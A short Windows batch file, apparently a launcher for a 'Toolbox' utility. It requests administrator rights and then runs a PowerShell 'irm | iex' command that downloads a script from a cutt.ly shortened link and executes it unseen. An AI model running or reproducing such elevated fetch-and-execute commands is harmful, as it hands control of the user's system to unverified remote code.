@echo off
:: Check for administrative privileges
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Run the PowerShell command with administrative privileges
powershell -Command "irm https://cutt.ly/ToolboxBS |iex"
pause
